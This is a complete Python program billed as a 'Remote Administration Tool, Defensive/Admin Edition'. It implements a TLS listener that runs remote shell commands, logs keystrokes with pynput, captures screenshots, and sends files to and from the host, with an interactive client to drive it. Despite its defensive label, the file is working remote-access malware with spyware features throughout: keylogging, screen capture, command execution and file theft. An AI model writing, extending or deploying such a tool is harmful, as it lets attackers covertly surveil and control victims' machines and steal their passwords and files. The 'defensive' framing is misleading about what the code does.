#!/usr/bin/env python3
"""
Remote Administration Tool (RAT) — Defensive/Admin Edition v2.0
- Listens for authorized client connections.
- Supports command execution, file transfer, screenshot, keylog.
- TLS 1.3 encrypted channel.
- Session logging to JSON.
- Improved: keylogger (pynput), cross-platform screenshots (mss),
  robust CLI (argparse), TLS validation, and hardened error paths.
"""

import argparse
import base64
import binascii
import io
import json
import os
import platform
import shlex
import ssl
import socket
import subprocess
import sys
import threading
import time
from collections import deque
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional


# ─── Keylogger ─────────────────────────────────────────────────────────────────

class KeyLogger:
    """Captures keystrokes using pynput and buffers them in-memory."""

    def __init__(self, flush_interval: float = 10.0):
        self.buffer: deque = deque(maxlen=10000)
        self._flushed: deque = deque(maxlen=10000)
        self.flush_interval = flush_interval
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._listener = None
        self._lock = threading.Lock()

    @property
    def available(self) -> bool:
        try:
            import pynput  # noqa: F401
            return True
        except ImportError:
            return False

    def start(self):
        if not self.available:
            raise RuntimeError("pynput not installed — pip install pynput")
        from pynput import keyboard

        self._running = True
        self._listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        )
        self._listener.daemon = True
        self._listener.start()

        self._thread = threading.Thread(target=self._flush_loop, daemon=True)
        self._thread.start()

    def _on_press(self, key):
        if not self._running:
            return False
        try:
            entry = getattr(key, "char", None) or f"[{key}]"
        except Exception:
            entry = "[?]"
        ts = datetime.now(timezone.utc).isoformat()
        with self._lock:
            self.buffer.append({"timestamp": ts, "key": entry})

    def _on_release(self, key):
        if not self._running:
            return False
        return True

    def _flush_loop(self):
        while self._running:
            time.sleep(self.flush_interval)
            # Move events instead of discarding them. They remain available
            # to the next explicit `keylog` read.
            with self._lock:
                self._flushed.extend(self.buffer)
                self.buffer.clear()

    def read(self) -> List[Dict[str, str]]:
        with self._lock:
            items = list(self._flushed)
            items.extend(self.buffer)
            self._flushed.clear()
            self.buffer.clear()
            return items

    def flush(self):
        """Force-flush — returns whatever is in the buffer."""
        return self.read()

    def stop(self):
        self._running = False
        if self._listener:
            self._listener.stop()
        if self._thread:
            self._thread.join(timeout=2.0)


# ─── Screenshot ─────────────────────────────────────────────────────────────────

class ScreenCapture:
    """Cross-platform screenshot capture using mss (falls back to PIL)."""

    def __init__(self):
        self._backend = None
        self._init_backend()

    def _init_backend(self):
        try:
            import mss  # noqa: F401
            self._backend = "mss"
        except ImportError:
            try:
                from PIL import ImageGrab  # noqa: F401
                self._backend = "pil"
            except ImportError:
                self._backend = None

    @property
    def available(self) -> bool:
        return self._backend is not None

    def grab(self) -> bytes:
        """Returns raw PNG bytes."""
        if self._backend == "mss":
            import mss
            with mss.mss() as sct:
                monitor = sct.monitors[1]  # primary monitor
                sct_img = sct.grab(monitor)
                return sct_img.png
        elif self._backend == "pil":
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
        else:
            raise RuntimeError("No screenshot backend available — install mss or Pillow")


# ─── Server ─────────────────────────────────────────────────────────────────────

class RATServer:
    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 4444,
        certfile: str = "server.crt",
        keyfile: str = "server.key",
        keylogger_interval: float = 10.0,
    ):
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.keylogger_interval = keylogger_interval

        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_3
        self.context.maximum_version = ssl.TLSVersion.TLSv1_3
        self.context.load_cert_chain(certfile, keyfile)

        self.clients: Dict[str, Dict[str, Any]] = {}
        self.sessions: List[Dict[str, Any]] = []
        self.lock = threading.Lock()
        self.running = False

        self.keypad = KeyLogger(flush_interval=keylogger_interval)
        self.screen = ScreenCapture()
        self._server_socket: Optional[socket.socket] = None
        self._accept_thread: Optional[threading.Thread] = None

    @property
    def client_count(self) -> int:
        with self.lock:
            return len(self.clients)

    def start(self):
        self.running = True

        self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_socket.bind((self.host, self.port))
        self._server_socket.listen(5)

        print(f"[RAT] Server listening on {self.host}:{self.port} (TLS 1.3)")

        self._accept_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._accept_thread.start()

    def _accept_loop(self):
        while self.running:
            try:
                client_socket, addr = self._server_socket.accept()
                try:
                    ssl_socket = self.context.wrap_socket(client_socket, server_side=True)
                except ssl.SSLError as e:
                    print(f"[RAT] TLS handshake failed from {addr}: {e}")
                    client_socket.close()
                    continue

                client_id = f"{addr[0]}:{addr[1]}"
                with self.lock:
                    self.clients[client_id] = {
                        "socket": ssl_socket,
                        "addr": addr,
                        "connected": datetime.now(timezone.utc).isoformat(),
                    }
                print(f"[RAT] Client connected: {client_id}")

                handler = threading.Thread(
                    target=self._handle_client,
                    args=(client_id, ssl_socket),
                    daemon=True,
                )
                handler.start()
            except OSError:
                break
            except Exception as e:
                print(f"[RAT] Accept error: {e}")

    def _handle_client(self, client_id: str, ssl_socket):
        buffer = b""
        while self.running:
            try:
                ssl_socket.settimeout(5.0)
                data = ssl_socket.recv(65535)
                if not data:
                    break
                buffer += data
                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    if line.strip():
                        try:
                            command = line.decode("utf-8")
                        except UnicodeDecodeError:
                            self._send_error(client_id, ssl_socket, "Invalid UTF-8 in command")
                            continue
                        self._process_command(client_id, ssl_socket, command)
            except socket.timeout:
                continue
            except ssl.SSLError as e:
                if "timed out" in str(e).lower():
                    continue
                break
            except (ConnectionResetError, BrokenPipeError):
                break
            except Exception as e:
                print(f"[RAT] Error in client loop {client_id}: {e}")
                break

        with self.lock:
            self.clients.pop(client_id, None)
        print(f"[RAT] Client disconnected: {client_id}")
        try:
            ssl_socket.close()
        except Exception:
            pass

    def _send_error(self, client_id: str, ssl_socket, error_msg: str):
        result = {
            "client": client_id,
            "command": None,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "error": error_msg,
        }
        try:
            ssl_socket.sendall((json.dumps(result) + "\n").encode())
        except Exception:
            pass

    def _process_command(self, client_id: str, ssl_socket, command: str):
        result: Dict[str, Any] = {
            "client": client_id,
            "command": command,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        try:
            cmd = json.loads(command)
        except json.JSONDecodeError:
            result["error"] = "Invalid JSON command"
            self._log_and_respond(client_id, ssl_socket, result)
            return

        if not isinstance(cmd, dict):
            result["error"] = "Command must be a JSON object"
            self._log_and_respond(client_id, ssl_socket, result)
            return

        action = cmd.get("action")

        if action == "exec":
            shell_cmd = cmd.get("cmd", "")
            if not shell_cmd:
                result["error"] = "No command provided"
            else:
                try:
                    parts = shlex.split(shell_cmd)
                    if not parts:
                        result["error"] = "No command provided"
                        self._log_and_respond(client_id, ssl_socket, result)
                        return
                    result["output"] = subprocess.check_output(
                        parts,
                        stderr=subprocess.STDOUT,
                        timeout=30,
                    ).decode("utf-8", errors="replace")
                except subprocess.TimeoutExpired:
                    result["error"] = "Command timed out after 30s"
                except FileNotFoundError:
                    result["error"] = f"Command not found: {parts[0]}"
                except Exception as e:
                    result["error"] = str(e)

        elif action == "sysinfo":
            result["output"] = {
                "os": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "hostname": platform.node(),
                "arch": platform.machine(),
                "python": platform.python_version(),
                "processor": platform.processor(),
            }

        elif action == "screenshot":
            try:
                if not self.screen.available:
                    result["error"] = "No screenshot backend (install mss or Pillow)"
                else:
                    raw = self.screen.grab()
                    result["output"] = base64.b64encode(raw).decode("ascii")
                    result["mime"] = "image/png"
            except Exception as e:
                result["error"] = f"Screenshot failed: {e}"

        elif action == "keylog":
            if not self.keypad.available:
                result["error"] = "pynput not installed — pip install pynput"
            else:
                try:
                    if not self.keypad._running:
                        self.keypad.start()
                    result["output"] = self.keypad.read()
                except Exception as e:
                    result["error"] = f"Keylogger failed: {e}"

        elif action == "keylog_stop":
            if self.keypad._running:
                self.keypad.stop()
                result["output"] = "Keylogger stopped"
            else:
                result["output"] = "Keylogger was not running"

        elif action == "ls":
            path = cmd.get("path", ".")
            try:
                entries = os.listdir(path)
                result["output"] = entries
            except (FileNotFoundError, NotADirectoryError, PermissionError) as e:
                result["error"] = str(e)

        elif action == "download":
            path = cmd.get("path")
            if not path:
                result["error"] = "No path provided"
            else:
                try:
                    with open(path, "rb") as f:
                        data = f.read()
                    result["output"] = base64.b64encode(data).decode("ascii")
                    result["size"] = len(data)
                    result["path"] = path
                except OSError as e:
                    result["error"] = str(e)

        elif action == "upload":
            path = cmd.get("path")
            data_b64 = cmd.get("data")
            if not path or not data_b64:
                result["error"] = "Missing 'path' or 'data' field"
            else:
                try:
                    raw = base64.b64decode(data_b64, validate=True)
                    with open(path, "wb") as f:
                        f.write(raw)
                    result["output"] = f"Uploaded {len(raw)} bytes to {path}"
                except (binascii.Error, ValueError) as e:
                    result["error"] = f"Invalid base64 data: {e}"
                except Exception as e:
                    result["error"] = str(e)

        elif action == "kill":
            self.running = False
            result["output"] = "Server shutting down"

        else:
            result["error"] = f"Unknown action: {action}"

        self._log_and_respond(client_id, ssl_socket, result)

    def _log_and_respond(self, client_id: str, ssl_socket, result: Dict[str, Any]):
        with self.lock:
            self.sessions.append(result)
        try:
            ssl_socket.sendall((json.dumps(result) + "\n").encode())
        except Exception:
            pass

    def broadcast(self, command_dict: Dict[str, Any]):
        payload = (json.dumps(command_dict) + "\n").encode()
        with self.lock:
            for client_id, info in list(self.clients.items()):
                try:
                    info["socket"].sendall(payload)
                except Exception:
                    self.clients.pop(client_id, None)

    def list_clients(self) -> List[str]:
        with self.lock:
            return list(self.clients.keys())

    def save_log(self, path: str = "rat_sessions.json"):
        with self.lock:
            with open(path, "w") as f:
                json.dump(self.sessions, f, indent=2)
        print(f"[RAT] Sessions saved to {path}")

    def stop(self):
        self.running = False
        if self.keypad._running:
            self.keypad.stop()
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass
        with self.lock:
            for client_id, info in list(self.clients.items()):
                try:
                    info["socket"].close()
                except Exception:
                    pass
            self.clients.clear()
        print("[RAT] Server stopped")


# ─── Client ────────────────────────────────────────────────────────────────────

class RATClient:
    def __init__(
        self,
        server_host: str,
        server_port: int,
        certfile: str = "server.crt",
        allow_insecure: bool = False,
    ):
        self.server_host = server_host
        self.server_port = server_port
        self.certfile = certfile
        self.context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        if allow_insecure:
            self.context.check_hostname = False
            self.context.verify_mode = ssl.CERT_NONE
        elif os.path.exists(certfile):
            self.context.load_verify_locations(certfile)
        else:
            raise FileNotFoundError(
                f"CA certificate not found: {certfile}. "
                "Use --cert or explicitly pass --no-verify for lab use."
            )
        self.socket: Optional[ssl.SSLSocket] = None
        self.running = False

    def connect(self):
        raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw.settimeout(10.0)
        self.socket = self.context.wrap_socket(
            raw, server_hostname=self.server_host
        )
        self.socket.connect((self.server_host, self.server_port))
        self.socket.settimeout(35.0)
        self.running = True
        print(f"[RAT] Connected to {self.server_host}:{self.server_port}")

    def send_command(self, action: str, **kwargs) -> Dict[str, Any]:
        if not self.socket:
            raise RuntimeError("Not connected — call connect() first")
        payload = {"action": action}
        payload.update(kwargs)
        self.socket.sendall((json.dumps(payload) + "\n").encode())

        response = b""
        while not response.endswith(b"\n"):
            chunk = self.socket.recv(65535)
            if not chunk:
                break
            response += chunk
        if not response:
            return {"error": "Connection closed by server"}
        return json.loads(response.decode("utf-8", errors="replace"))

    def disconnect(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass

    def interactive_loop(self):
        """REPL loop for sending commands to the server."""
        print("RAT> Type 'help' for available commands, 'exit' to quit.")
        while self.running:
            try:
                cmd = input("RAT> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not cmd:
                continue

            if cmd == "exit":
                break
            elif cmd == "help":
                print("""
Available commands:
  sysinfo                          - Get system information
  ls [path]                        - List directory (default: current)
  exec <command>                   - Run a shell command remotely
  screenshot                       - Capture screenshot (saves to ./screenshots/)
  keylog                           - Start/read keylogger
  keylog_stop                      - Stop keylogger
  download <path>                  - Download a file from target
  upload <path> <base64_data>      - Upload a file to target
  exit                             - Disconnect
""")
                continue

            parts = cmd.split(maxsplit=1)
            action = parts[0]
            args = parts[1] if len(parts) > 1 else ""

            try:
                if action == "sysinfo":
                    resp = self.send_command("sysinfo")
                elif action == "ls":
                    path = args if args else "."
                    resp = self.send_command("ls", path=path)
                elif action == "exec":
                    if not args:
                        print("Usage: exec <command>")
                        continue
                    resp = self.send_command("exec", cmd=args)
                elif action == "screenshot":
                    resp = self.send_command("screenshot")
                    if "output" in resp and resp.get("mime") == "image/png":
                        os.makedirs("screenshots", exist_ok=True)
                        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
                        fname = f"screenshots/screenshot_{ts}.png"
                        raw = base64.b64decode(resp["output"])
                        with open(fname, "wb") as f:
                            f.write(raw)
                        resp["output"] = f"Saved to {fname}"
                elif action == "keylog":
                    resp = self.send_command("keylog")
                elif action == "keylog_stop":
                    resp = self.send_command("keylog_stop")
                elif action == "download":
                    if not args:
                        print("Usage: download <path>")
                        continue
                    resp = self.send_command("download", path=args)
                elif action == "upload":
                    upload_parts = args.split(maxsplit=1)
                    if len(upload_parts) < 2:
                        print("Usage: upload <path> <base64_data>")
                        continue
                    up_path = upload_parts[0]
                    up_data = upload_parts[1]
                    resp = self.send_command("upload", path=up_path, data=up_data)
                else:
                    print(f"Unknown command: {action}. Type 'help' for list.")
                    continue

                print(json.dumps(resp, indent=2, default=str))
            except ConnectionError as e:
                print(f"[RAT] Connection error: {e}")
                break
            except Exception as e:
                print(f"[RAT] Error: {e}")


# ─── CLI ───────────────────────────────────────────────────────────────────────

def generate_cert(certfile: str = "server.crt", keyfile: str = "server.key"):
    """Generate self-signed certificate for testing."""
    cmd = [
        "openssl", "req", "-x509", "-newkey", "rsa:2048",
        "-keyout", keyfile,
        "-out", certfile,
        "-days", "365",
        "-nodes",
        "-subj", "/CN=localhost",
        "-addext", "subjectAltName=DNS:localhost,IP:127.0.0.1",
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        try:
            os.chmod(keyfile, 0o600)
        except OSError:
            pass
        print(f"[RAT] Generated {certfile} and {keyfile}")
    except FileNotFoundError:
        print("[RAT] openssl not found — install OpenSSL or generate manually")
    except subprocess.CalledProcessError as e:
        print(f"[RAT] Certificate generation failed: {e.stderr.decode()}")


def main():
    parser = argparse.ArgumentParser(
        description="Remote Administration Tool (Defensive/Admin Edition)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  %(prog)s server --port 4444 --host 127.0.0.1
  %(prog)s client 127.0.0.1 4444
  %(prog)s gen-cert
""",
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── Server ──
    sp_server = sub.add_parser("server", help="Start RAT server")
    sp_server.add_argument("--host", default="0.0.0.0", help="Bind host (default: 0.0.0.0)")
    sp_server.add_argument("--port", type=int, default=4444, help="Listen port (default: 4444)")
    sp_server.add_argument("--cert", default="server.crt", help="TLS certificate file")
    sp_server.add_argument("--key", default="server.key", help="TLS key file")
    sp_server.add_argument("--keylog-interval", type=float, default=10.0,
                           help="Keylogger flush interval in seconds (default: 10)")

    # ── Client ──
    sp_client = sub.add_parser("client", help="Connect as client")
    sp_client.add_argument("host", help="Server host")
    sp_client.add_argument("port", type=int, help="Server port")
    sp_client.add_argument("--cert", default="server.crt", help="CA cert to verify server")
    sp_client.add_argument("--no-verify", action="store_true",
                           help="Skip TLS verification (lab only)")

    # ── Gen Cert ──
    sp_cert = sub.add_parser("gen-cert", help="Generate self-signed certificate")
    sp_cert.add_argument("--cert", default="server.crt")
    sp_cert.add_argument("--key", default="server.key")

    args = parser.parse_args()

    if args.mode == "server":
        server = RATServer(
            host=args.host,
            port=args.port,
            certfile=args.cert,
            keyfile=args.key,
            keylogger_interval=args.keylog_interval,
        )
        try:
            server.start()
            print("[RAT] Press Ctrl+C to stop.")
            while server.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[RAT] Shutting down...")
        finally:
            server.save_log()
            server.stop()

    elif args.mode == "client":
        client = None
        try:
            client = RATClient(
                args.host,
                args.port,
                certfile=args.cert,
                allow_insecure=args.no_verify,
            )
            client.connect()
            client.interactive_loop()
        except ConnectionRefusedError:
            print(f"[RAT] Connection refused — is the server running on {args.host}:{args.port}?")
        except FileNotFoundError as e:
            print(f"[RAT] {e}")
        except ssl.SSLError as e:
            print(f"[RAT] TLS error: {e}")
        except OSError as e:
            print(f"[RAT] Connection error: {e}")
        except KeyboardInterrupt:
            pass
        finally:
            if client:
                client.disconnect()

    elif args.mode == "gen-cert":
        generate_cert(args.cert, args.key)


if __name__ == "__main__":
    main()
